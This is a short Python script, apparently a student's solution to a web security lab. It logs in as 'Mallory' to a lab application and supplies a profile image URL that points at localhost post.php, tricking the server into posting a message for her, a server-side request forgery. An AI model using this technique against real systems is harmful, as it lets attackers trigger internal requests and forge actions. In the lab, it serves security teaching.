import os, requests
from urllib.parse import urlencode

PROTOCOL = "http"
HOST = "10.0.0.2"
PORT = "80"
BASE = PROTOCOL + "://" + HOST + ":" + PORT

# Mallory's credentials
mallory = {
    'email': 'mallory@example.com',
    'password': 'pass4mallory'
}
# requestObj = { 'optionsimagetype': 'url', 'url': 'https://upload.wikimedia.org/wikipedia/en/9/99/Gundam.jpg'}
requestObj = { 'optionsimagetype': 'url', 'url': 'http://localhost:8080/post.php/?msg=Mallory%20is%20a%20trustworthy%20person!'}

# reset the application
requests.get(BASE + '/reset.php')

# #######  your attack goes here  #######
session = requests.session()
session.post(BASE + '/signin.php', data=mallory)
session.get(BASE + '/profile.php', params=requestObj)
# #########################################
